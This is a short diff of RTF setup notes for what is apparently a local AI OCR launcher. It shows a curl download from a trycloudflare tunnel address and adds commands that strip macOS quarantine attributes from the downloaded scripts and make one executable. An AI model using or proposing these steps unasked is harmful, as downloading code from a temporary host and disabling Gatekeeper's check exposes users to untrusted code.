@@ -119,6 +119,9 @@ curl https://\uc0\u1042 \u1040 \u1064 -OCR.trycloudflare.com/\
 \pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
 \cf2 cd ~/ocr && chmod +x start-local-ai.command\
 \
+xattr -d com.apple.quarantine start-local-ai.command\
+xattr -d com.apple.quarantine local-ai-launcher.py\
+chmod +x start-local-ai.command\
 \
 \
 \
